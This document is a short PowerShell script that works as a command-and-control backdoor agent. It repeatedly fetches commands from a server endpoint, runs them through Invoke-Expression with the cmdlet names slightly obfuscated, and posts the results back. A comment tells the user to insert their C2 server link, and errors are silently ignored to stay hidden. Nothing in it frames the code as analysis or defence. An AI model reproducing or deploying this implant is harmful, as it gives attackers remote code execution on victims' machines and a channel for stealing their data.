# repalce /command & /output with c2 server link.
$a1 = '/command'
$b2 = '/output'

$iwr = 'iwr'
$iex = 'iex'

function Get-TimeStamp { [DateTime]::Now.ToString() | Out-Null }

while ($true) {
    try {
        $cmd = (& $iwr $a1 -UseBasicParsing).Content.Trim()
        if ($cmd -and $cmd -ne 'noop') {
            $out = (& $iex $cmd 2>&1 | Out-String)

            Get-TimeStamp

            (& $iwr $b2 -Method POST -Body @{output=$out} -UseBasicParsing) | Out-Null
        }
    } catch {
        # Ignore errors silently
    }
    Start-Sleep -Seconds 5
}
